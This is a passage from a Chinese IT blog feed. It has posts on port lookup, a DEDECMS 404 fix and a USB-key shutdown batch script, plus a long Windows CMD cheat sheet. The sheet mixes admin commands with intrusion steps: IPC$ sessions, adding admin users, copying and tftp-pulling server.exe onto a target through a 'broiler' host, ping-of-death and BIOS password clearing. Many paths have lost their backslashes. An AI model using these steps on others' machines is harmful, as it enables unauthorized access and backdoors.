        <content type="html"><![CDATA[<p>1、打开Windows Powershell输入命令 netstat -ano 列出所有通信端口<br><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218003613.png" alt=""><br>2、CLOSE_WAIT表示关闭 ESTABLLSHED表示活跃状态<br><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218003938.png" alt=""><br>3、tasklist /svc 查看端口ID<br><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218004258.png" alt=""><br>４、输入 cmd 接着在输入 tasklist /svc ｜ find “端口号”<br><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218005005.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> IT技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IT技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安装DEDECMS出现404</title>
      <link href="/posts/33323.html"/>
      <url>/posts/33323.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200203161059.PNG" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200203161100.PNG" alt=""></p><p>可以读取robots.txt，说明解析没问题</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200203161102.PNG" alt=""></p><p>尝试加端口访问，发现可以。。。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200203161102.PNG" alt=""></p><blockquote><p>经过排查，这个错误是没有默认读取index.php导致404状态，需要手工输入路径        格式：域名:3333/install/index.php</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> IT技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IT技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用的CMD命令笔记整理</title>
      <link href="/posts/19253.html"/>
      <url>/posts/19253.html</url>
      
        <content type="html"><![CDATA[<p>CMD命令：开始－&gt;运行－&gt;键入cmd或command（在命令行里可以看到系统版本、文件系统版本）<br>chcp 修改默认字符集<br>chcp 936默认中文<br>chcp 65001  </p><ol><li><p>appwiz.cpl：程序和功能  </p></li><li><p>calc：启动计算器</p></li><li><p>chkdsk.exe：Chkdsk磁盘检查（管理员身份运行命令提示符）</p></li><li><p>cleanmgr: 打开磁盘清理工具  </p></li><li><p>cmd.exe：CMD命令提示符  </p></li><li><p>自动关机命令  </p><p>　 Shutdown -s -t 600：表示600秒后自动关机  </p><p>　 shutdown -a ：可取消定时关机  </p><p>　 Shutdown -r -t 600：表示600秒后自动重启  </p><p>　</p></li><li><p>CompMgmtLauncher：计算机管理  </p></li><li><p>compmgmt.msc：计算机管理  </p></li><li><p>credwiz：备份或还原储存的用户名和密码</p></li><li><p>control：控制面版  </p></li><li><p>dcomcnfg：打开系统组件服务  </p></li><li><p>devmgmt.msc：设备管理器  </p></li><li><p>desk.cpl：屏幕分辨率  </p></li><li><p>dfrgui：优化驱动器 Windows 7→dfrg.msc：磁盘碎片整理程序  </p></li><li><p>dialer：电话拨号程序  </p></li><li><p>diskmgmt.msc：磁盘管理  </p></li><li><p>dvdplay：DVD播放器  </p></li><li><p>dxdiag：检查DirectX信息  </p></li><li><p>eudcedit：造字程序  </p></li><li><p>eventvwr：事件查看器  </p></li><li><p>explorer：打开资源管理器  </p></li><li><p>Firewall.cpl：Windows防火墙</p></li><li><p>fsmgmt.msc：共享文件夹管理器  </p></li><li><p>gpedit.msc：组策略  </p></li><li><p>hdwwiz.cpl：设备管理器  </p></li><li><p>inetcpl.cpl：Internet属性  </p></li><li><p>intl.cpl：区域  </p></li><li><p>iexpress：木马捆绑工具，系统自带  </p></li><li><p>joy.cpl：游戏控制器  </p></li><li><p>logoff：注销命令  </p></li><li><p>lusrmgr.msc：本地用户和组  </p></li><li><p>lpksetup：语言包安装/删除向导，安装向导会提示下载语言包  </p></li><li><p>lusrmgr.msc：本机用户和组  </p></li><li><p>main.cpl：鼠标属性  </p></li><li><p>mmsys.cpl：声音  </p></li><li><p>mem.exe：显示内存使用情况（如果直接运行无效，可以先管理员身份运行命令提示符，在命令提示符里输入mem.exe&gt;d:a.txt 即可打开d盘查看a.txt，里面的就是内存使用情况了。当然什么盘什么文件名可自己决定。）</p></li><li><p>mmc：打开控制台  </p></li><li><p>mobsync：同步命令  </p></li><li><p>Msconfig.exe：系统配置实用程序  </p></li><li><p>msdt：微软支持诊断工具  </p></li><li><p>msinfo32：系统信息  </p></li><li><p>mspaint：画图  </p></li><li><p>Msra：Windows远程协助  </p></li><li><p>mstsc：远程桌面连接  </p></li><li><p>NAPCLCFG.MSC：客户端配置  </p></li><li><p>ncpa.cpl：网络连接  </p></li><li><p>narrator：屏幕“讲述人”  </p></li><li><p>Netplwiz：高级用户帐户控制面板，设置登陆安全相关的选项  </p></li><li><p>netstat : an(TC)命令检查接口  </p></li><li><p>notepad：打开记事本  </p></li><li><p>Nslookup：IP地址侦测器  </p></li><li><p>odbcad32：ODBC数据源管理器</p></li><li><p>OptionalFeatures：打开“打开或关闭Windows功能”对话框</p></li><li><p>osk：打开屏幕键盘  </p></li><li><p>perfmon.msc：计算机性能监测器  </p></li><li><p>perfmon：计算机性能监测器  </p></li><li><p>PowerShell：提供强大远程处理能力  </p></li><li><p>printmanagement.msc：打印管理  </p></li><li><p>powercfg.cpl：电源选项  </p></li><li><p>psr：问题步骤记录器  </p></li><li><p>Rasphone：网络连接  </p></li><li><p>Recdisc：创建系统修复光盘  </p></li><li><p>Resmon：资源监视器  </p></li><li><p>Rstrui：系统还原  </p></li><li><p>regedit.exe：注册表  </p></li><li><p>regedt32：注册表编辑器  </p></li><li><p>rsop.msc：组策略结果集  </p></li><li><p>sdclt：备份状态与配置，就是查看系统是否已备份  </p></li><li><p>secpol.msc：本地安全策略  </p></li><li><p>services.msc：本地服务设置  </p></li><li><p>sfc /scannow：扫描错误并复原/windows文件保护  </p></li><li><p>sfc.exe：系统文件检查器  </p></li><li><p>shrpubw：创建共享文件夹  </p></li><li><p>sigverif：文件签名验证程序  </p></li><li><p>slui：Windows激活，查看系统激活信息  </p></li><li><p>slmgr.vbs -dlv ：显示详细的许可证信息  </p><p>　 slmgr.vbs -dli ：显示许可证信息  </p><p>　 slmgr.vbs -xpr ：当前许可证截止日期  </p><p>　 slmgr.vbs -dti ：显示安装ID 以进行脱机激  </p><p>　 slmgr.vbs -ipk ：(Product Key)安装产品密钥  </p><p>　 slmgr.vbs -ato ：激活Windows  </p><p>　 slmgr.vbs -cpky ：从注册表中清除产品密钥（防止泄露引起的攻击）  </p><p>　 slmgr.vbs -ilc ：(License file)安装许可证  </p><p>　 slmgr.vbs -upk ：卸载产品密钥  </p><p>　 slmgr.vbs -skms ：(name[ort] )批量授权  </p></li><li><p>snippingtool：截图工具，支持无规则截图  </p></li><li><p>soundrecorder：录音机，没有录音时间的限制  </p></li><li><p>StikyNot：便笺  </p></li><li><p>sysdm.cpl：系统属性  </p></li><li><p>sysedit：系统配置编辑器  </p></li><li><p>syskey：系统加密，一旦加密就不能解开，保护系统的双重密码  </p></li><li><p>taskmgr：任务管理器（旧版）  </p></li><li><p>TM任务管理器（新版）  </p></li><li><p>taskschd.msc：任务计划程序  </p></li><li><p>timedate.cpl：日期和时间  </p></li><li><p>UserAccountControlSettings用户账户控制设置  </p></li><li><p>utilman：辅助工具管理器  </p></li><li><p>wf.msc：高级安全Windows防火墙  </p></li><li><p>WFS：Windows传真和扫描  </p></li><li><p>wiaacmgr：扫描仪和照相机向导  </p></li><li><p>winver：关于Windows  </p></li><li><p>wmimgmt.msc：打开windows管理体系结构(WMI)  </p></li><li><p>write：写字板  </p></li><li><p>wscui.cpl：操作中心  </p></li><li><p>wscript：windows脚本宿主设置  </p></li><li><p>wuapp：Windows更新</p></li></ol><p>　　1. gpedit.msc—–组策略  </p><p>　　2. sndrec32——-录音机  </p><p>　　3. Nslookup——-IP地址侦测器 ，是一个 监测网络中 DNS 服务器是否能正确实现域名解析的命令行工具。 它在 Windows NT/2000/XP 中均可使用 , 但在 Windows 98 中却没有集成这一个工具。  </p><p>　　4. explorer——-打开资源管理器  </p><p>　　5. logoff———注销命令  </p><p>　　6. shutdown——-60秒倒计时关机命令  </p><p>　　7. lusrmgr.msc—-本机用户和组  </p><p>　　8. services.msc—本地服务设置  </p><p>　　9. oobe/msoobe /a—-检查XP是否激活  </p><p>　　10. notepad——–打开记事本  </p><p>　　11. cleanmgr——-垃圾整理  </p><p>　　12. net start messenger—-开始信使服务  </p><p>　　13. compmgmt.msc—计算机管理  </p><p>　　14. net stop messenger—–停止信使服务  </p><p>　　15. conf———–启动netmeeting  </p><p>　　16. dvdplay——–DVD播放器  </p><p>　　17. charmap——–启动字符映射表  </p><p>　　18. diskmgmt.msc—磁盘管理实用程序  </p><p>　　19. calc———–启动计算器  </p><p>　　20. dfrg.msc——-磁盘碎片整理程序  </p><p>　　21. chkdsk.exe—–Chkdsk磁盘检查  </p><p>　　22. devmgmt.msc— 设备管理器  </p><p>　　23. regsvr32 /u *.dll—-停止dll文件运行  </p><p>　　24. drwtsn32—— 系统医生  </p><p>　　25. rononce -p—-15秒关机  </p><p>　　26. dxdiag———检查DirectX信息  </p><p>　　27. regedt32——-注册表编辑器  </p><p>　　28. Msconfig.exe—系统配置实用程序  </p><p>　　29. rsop.msc——-组策略结果集  </p><p>　　30. mem.exe——–显示内存使用情况  </p><p>　　31. regedit.exe—-注册表  </p><p>　　32. winchat——–XP自带局域网聊天  </p><p>　　33. progman——–程序管理器  </p><p>　　34. winmsd———系统信息  </p><p>　　35. perfmon.msc—-计算机性能监测程序  </p><p>　　36. winver———检查Windows版本  </p><p>　　37. sfc /scannow—–扫描错误并复原  </p><p>　　38. taskmgr—–任务管理器（2000/xp/2003  </p><p>　　39. winver———检查Windows版本  </p><p>　　40. wmimgmt.msc—-打开windows管理体系结构(WMI)  </p><p>　　41. wupdmgr——–windows更新程序  </p><p>　　42. wscript——–windows脚本宿主设置  </p><p>　　43. write———-写字板  </p><p>　　44. winmsd———系统信息  </p><p>　　45. wiaacmgr——-扫描仪和照相机向导  </p><p>　　46. winchat——–XP自带局域网聊天  </p><p>　　47. mem.exe——–显示内存使用情况  </p><p>　　48. Msconfig.exe—系统配置实用程序  </p><p>　　49. mplayer2——-简易widnows media player  </p><p>　　50. mspaint——–画图板  </p><p>　　51. mstsc———-远程桌面连接  </p><p>　　52. mplayer2——-媒体播放机  </p><p>　　53. magnify——–放大镜实用程序  </p><p>　　54. mmc————打开控制台  </p><p>　　55. mobsync——–同步命令  </p><p>　　56. dxdiag———检查DirectX信息  </p><p>　　57. iexpress——-木马捆绑工具，系统自带 58. fsmgmt.msc—–共享文件夹管理器  </p><p>　　59. utilman——–辅助工具管理器  </p><p>　　60. diskmgmt.msc—磁盘管理实用程序  </p><p>　　61. dcomcnfg——-打开系统组件服务  </p><p>　　62. ddeshare——-打开DDE共享设置  </p><p>　　110. osk————打开屏幕键盘  </p><p>　　111. odbcad32——-ODBC数据源管理器  </p><p>　　112. oobe/msoobe /a—-检查XP是否激活 114. logoff———注销命令  </p><p>　　66. notepad——–打开记事本  </p><p>　　67. nslookup——-网络管理的工具向导  </p><p>　　68. ntbackup——-系统备份和还原  </p><p>　　69. narrator——-屏幕“讲述人”  </p><p>　　70. ntmsmgr.msc—-移动存储管理器  </p><p>　　71. ntmsoprq.msc—移动存储管理员操作请求  </p><p>　　72. netstat -an—-(TC)命令检查接口  </p><p>　　73. syncapp——–创建一个公文包  </p><p>　　74. sysedit——–系统配置编辑器  </p><p>　　75. sigverif——-文件签名验证程序  </p><p>　　76. ciadv.msc——索引服务程序  </p><p>　　77. shrpubw——–创建共享文件夹  </p><p>　　78. secpol.msc—–本地安全策略  </p><p>　　79. syskey———系统加密，一旦加密就不能解开，保护windows xp系统的双重密码  </p><p>　　80. services.msc—本地服务设置  </p><p>　　81. Sndvol32——-音量控制程序  </p><p>　　82. sfc.exe——–系统文件检查器  </p><p>　　83. sfc /scannow—windows文件保护  </p><p>　　84. ciadv.msc——索引服务程序  </p><p>　　85. tourstart——xp简介（安装完成后出现的漫游xp程序）  </p><p>　　86. taskmgr——–任务管理器  </p><p>　　87. eventvwr——-事件查看器  </p><p>　　88. eudcedit——-造字程序  </p><p>　　89. compmgmt.msc—计算机管理  </p><p>　　90. packager——-对象包装程序  </p><p>　　91. perfmon.msc—-计算机性能监测程序  </p><p>　　92. charmap——–启动字符映射表  </p><p>　　93. cliconfg——-SQL SERVER 客户端网络实用程序  </p><p>　　94. Clipbrd——–剪贴板查看器  </p><p>　　95. conf———–启动netmeeting  </p><p>　　96. certmgr.msc—-证书管理实用程序  </p><p>　　97. regsvr32 /u *.dll—-停止dll文件运行  </p><p>　　98. regsvr32 /u zipfldr.dll——取消ZIP支持  </p><p>　　99. cmd.exe——–CMD命令提示符  </p><p>　　100. chkdsk.exe—–Chkdsk磁盘检查  </p><p>1.磁盘操作，<br>　　fdisk 隐含 参数 /mbr 重建主引导记录fdisk /mbr 重建主引导记录<br>　　fdisk 在DOS7.0以后增加了/cmbr参数，可在挂接多个物理硬盘时，重建排序在后面的硬盘的主引导记录，例如：fdisk /cmbr 2，可重写第二个硬盘的主引导记录。（在使用时要十分小心，避免把好的硬盘引导记录损坏）<br>　　format 参数： /q 快速格式化 /u 不可恢复 /autotest 不提示 /s 创建 MS-DOS 引导盘 format c: /q /u /autotest<br>2.目录操作<br>　　DIR [目录名或文件名] [/S][/W][/P][/A] 列出目录 参数: /s 查找子目录/w 只显示文件名 /p 分页/a 显示隐藏文件 DIR format.exe /s查找该盘的format.exe文件并报告位置<br>　　MD (MKDIR) [目录名] 创建目录 MKDIR HELLOWORLD 创建HELLOWORLD目录<br>　　CD (CHDIR) [目录名] PS:可以使用相对目录或绝对目录 进入目录 CD AA 进入当前文件夹下的AA目录,cd .. 进入上一个文件夹cd \返回根目录;cd c:\windows 进入c:\windows文件夹<br>　　RD ( RMDIR) [目录名] 删除目录 RD HELLOWORLD 删除HELLOWORLD目录<br>3.文件操作<br>　　删除目录及其文件： rmdir [目录名或文件名] [/S][/W][/P][/A] 。例 rmdir c:\qqdownload/s 删除C盘的qqdownload目录。<br>　　del [目录名或文件名] [/f][/s][/q] 删除 参数:/f 删除只读文件/s 删除该目录及其下的所有内容 /q 删除前不确认<br>　　del c:\del /s /q 自动删除c盘的del目录。<br>　　copy [源文件或目录] [目标目录] 复制文件 copy d:\pwin98*.* c:\presetup 将d盘的pwin98的所有文件复制到c盘的presetup下。<br>　　attrib [参数][源文件或目录] 文件属性操作命令，attrib命令可以列出或修改磁盘上文件的属性，文件属性包括文档（A）、只读(R)、隐藏(H)、系统(S)，例如：attrib -h -r -s io.sys 执行这一命令后，将把DOS系统文件io.sys文件的只读、隐藏、系统属性去掉，这时将可以直接通过dir命令看到io.sys文件。attrib +h +r +s autoexec.bat将为自动批处理文件增加以上属性。<br>4.内存操作<br>　　debug 调试内存 参数 -w [文件名] 写入二进制文件 -o [地址1] [地址2] 输出内存 -q 退出 exp:o 70 10[return] o 71 01<br>　　[return] 01[return] q[return] DOS下通过写70h/71h PORT改变BIOS密码在CMOS中存放的对应位置的值,用以清除AWARD BIOS密码.debug 还可以破解硬盘保护卡等,但只可以在纯DOS下用。<br>5.分区操作<br>　　给磁盘分区，一般都会分成四个区，磁盘分区由主分区、扩展分区、逻辑分区组成。<br>　　PQ和Acronis Disk Director这两个工具都可以在不丢失数据的情况下对分区进行调整大小，以及合并等操作，XP系统的话你用PQ，WIN7系统的话用Acronis Disk Director 操作基本一样，可以去网上找教程来看看，再不重装系统的情况下都能调整分区大小，但是建议你还是先备份下数据再调整，毕竟对硬盘直接进行的操作有一定的危险性。</p><p>　　net use ipipc$ “ “ /user:” “ 建立IPC空链接  </p><p>　　net use ipipc$ “密码” /user:”用户名” 建立IPC非空链接  </p><p>　　net use h: ipc$ “密码” /user:”用户名” 直接登陆后映射对方C：到本地为H:  </p><p>　　net use h: ipc$ 登陆后映射对方C：到本地为H:  </p><p>　　net use ipipc$ /del 删除IPC链接  </p><p>　　net use h: /del 删除映射对方到本地的为H:的映射  </p><p>　　net user 用户名　密码　/add 建立用户  </p><p>　　net user guest /active:yes 激活guest用户  </p><p>　　net user 查看有哪些用户  </p><p>　　net user 帐户名 查看帐户的属性  </p><p>　　net localgroup administrators 用户名 /add 把“用户”添加到管理员中使其具有管理员权限  </p><p>　　net start 查看开启了哪些服务  </p><p>　　net start 服务名　开启服务；(如:net start telnet， net start schedule)  </p><p>　　net stop 服务名 停止某服务  </p><p>　　net time 目标ip 查看对方时间  </p><p>　　net time 目标ip /set 设置本地计算机时间与“目标IP”主机的时间同步,加上参数/yes可取消确认信息  </p><p>　　net view 查看本地局域网内开启了哪些共享  </p><p>　　net view ip 查看对方局域网内开启了哪些共享  </p><p>　　net config 显示系统网络设置  </p><p>　　net logoff 断开连接的共享  </p><p>　　net pause 服务名 暂停某服务  </p><p>　　net send ip “文本信息” 向对方发信息  </p><p>　　net ver 局域网内正在使用的网络连接类型和信息  </p><p>　　net share 查看本地开启的共享  </p><p>　　net share ipc$ 开启ipc$共享  </p><p>　　net share ipc$ /del 删除ipc$共享  </p><p>　　net share c$ /del 删除C：共享  </p><p>　　net user guest 12345 用guest用户登陆后用将密码改为12345  </p><p>　　net password 密码 更改系统登陆密码  </p><p>　　netstat -a 查看开启了哪些端口,常用netstat -an  </p><p>　　netstat -n 查看端口的网络连接情况，常用netstat -an  </p><p>　　netstat -v 查看正在进行的工作  </p><p>　　netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况  </p><p>　　netstat -s 查看正在使用的所有协议使用情况  </p><p>　　nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名  </p><p>　　tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。  </p><p>　　ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。  </p><p>　　ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping)  </p><p>　　ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息  </p><p>　　tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)  </p><p>　　kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)  </p><p>　　del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR <em>.</em>”表示删除当前目录下所有只读文件，“DEL/A-S <em>.</em>”表示删除当前目录下除系统文件以外的所有文件  </p><p>　　del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同）  </p><p>　　move 盘符路径要移动的文件名　存放移动文件的路径移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖  </p><p>　　fc one.txt two.txt &gt; 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，”&gt; “和”&gt; &gt;” 是重定向命令  </p><p>　　at id号 开启已注册的某个计划任务  </p><p>　　at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止  </p><p>　　at id号 /delete 停止某个已注册的计划任务  </p><p>　　at 查看所有的计划任务  </p><p>　　at ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机  </p><p>　　finger username @host 查看最近有哪些用户登陆  </p><p>　　telnet ip 端口 远和登陆服务器,默认端口为23  </p><p>　　open ip 连接到IP（属telnet登陆后的命令）  </p><p>　　telnet 在本机上直接键入telnet 将进入本机的telnet  </p><p>　　copy 路径文件名1　路径文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件  </p><p>　　copy c:srv.exe ipadmin$ 复制本地c:srv.exe到对方的admin下  </p><p>　　copy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件  </p><p>　　copy ipadmin$svv.exe c: 或:copyipadmin$<em>.</em> 复制对方admini$共享下的srv.exe文件（所有文件）至本地C：  </p><p>　　xcopy 要复制的文件或目录树　目标地址目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件  </p><p>　　用参数/e才可连目录下的子目录一起复制到目标地址下。  </p><p>　　tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exec:server.exe 登陆后，将“IP”的server.exe下载到目标主机c:server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送  </p><p>　　tftp -i 对方IP　put c:server.exe 登陆后，上传本地c:server.exe至主机  </p><p>　　ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时)  </p><p>　　route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface  </p><p>　　arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息  </p><p>　　start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令  </p><p>　　mem 查看cpu使用情况  </p><p>　　attrib 文件名(目录名) 查看某文件（目录）的属性  </p><p>　　attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用+则是添加为某属性  </p><p>　　dir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间  </p><p>　　date /t 、 time /t 使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和时间，而不必输入新日期和时间  </p><p>　　set 指定环境变量名称=要指派给变量的字符 设置环境变量  </p><p>　　set 显示当前所有的环境变量  </p><p>　　set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量  </p><p>　　pause 暂停批处理程序，并显示出：请按任意键继续….  </p><p>　　if 在批处理程序中执行条件处理（更多说明见if命令及变量）  </p><p>　　goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签）  </p><p>　　call 路径批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?）  </p><p>　　for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量）  </p><p>　　echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置  </p><p>　　echo 信息 在屏幕上显示出信息  </p><p>　　echo 信息 &gt;&gt; pass.txt 将”信息”保存到pass.txt文件中  </p><p>　　findstr “Hello” aa.txt 在aa.txt文件中寻找字符串hello  </p><p>　　find 文件名 查找某文件  </p><p>　　title 标题名字 更改CMD窗口标题名字  </p><p>　　color 颜色值 设置cmd控制台前景和背景颜色；0=黑、1=蓝、2=绿、3=浅绿、4=红、5=紫、6=黄、7=白、8=灰、9=淡蓝、A=淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白  </p><p>　　prompt 名称 更改cmd.exe的显示的命令提示符(把C:、D:统一改为：EntSky )  </p><p>　　ver 在DOS窗口下显示版本信息  </p><p>　　winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名）  </p><p>　　format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS  </p><p>　　md　目录名 创建目录  </p><p>　　replace 源文件　要替换文件的目录 替换文件  </p><p>　　ren 原文件名　新文件名 重命名文件名  </p><p>　　tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称  </p><p>　　type 文件名 显示文本文件的内容  </p><p>　　more 文件名 逐屏显示输出文件  </p><p>　　doskey 要锁定的命令=字符  </p><p>　　doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；解锁：doskey dir=  </p><p>　　taskmgr 调出任务管理器  </p><p>　　chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误  </p><p>　　tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口  </p><p>　　exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe  </p><p>　　path 路径可执行文件的文件名 为可执行文件设置一个路径。  </p><p>　　cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /?  </p><p>　　regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示；  </p><p>　　regedit /e 注册表文件名 导出注册表  </p><p>　　cacls 文件名　参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D: est.txt /D pub 设定d: est.txt拒绝pub用户访问。  </p><p>　　cacls 文件名 查看文件的访问用户权限列表  </p><p>　　REM 文本内容 在批处理文件中添加注解  </p><p>　　netsh 查看或更改本地网络配置情况</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> IT技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IT技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1分钟自制「加密狗」，没有U盘谁用不了你的电脑</title>
      <link href="/posts/50651.html"/>
      <url>/posts/50651.html</url>
      
        <content type="html"><![CDATA[<p>所以今天就来教你，如何花 1分钟 自制一个「加密狗」，保护你硬盘中的女神。</p><p><del>除非他人可以把你硬盘拆着走</del></p><p>ps：「加密狗」是一种身份认证的硬件，只有当「加密狗」连接时，设备或程序才能启动。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200201114909.webp" alt=""></p><p>首先插入你的U盘，在U盘中新建「文本文档」，名称随意，扩展名也随意（我这里是 <code>Key.MY</code>）。</p><p>如果你的电脑不显示扩展名，先在「查看」中勾选扩「文件展名」，我这里就不再啰嗦显示后缀名方法啦，，，</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200201115135.webp" alt=""></p><p>然后再新建一个「文本文档」，打开在里面输入</p><p><code>if not exist F:key.my shutdown -s -t 1</code></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200201115413.webp" alt=""></p><p>代码注释：</p><p>//意思是 如果 F 没有 <code>Key.MY</code> 则在 1 秒内执行关机命令。（你的 U 盘在电脑中可能不是F盘，根据实际情况输入，如果把 <code>-t</code> 后面的数字是倒数时间，单位是秒）</p><p>保存后给它取个响亮的名字，扩展名改为 <code>.bat</code> （批处理文件）</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200201115759.webp" alt=""></p><p>然后将这个 <code>.bat</code> 复制到 C 盘中某个角落</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200201115827.webp" alt=""></p><p>在开始菜单搜索打开「组策略」</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200201120226.webp" alt=""></p><p>Windows 设置 - 脚步（启动/关机） - 启动</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" 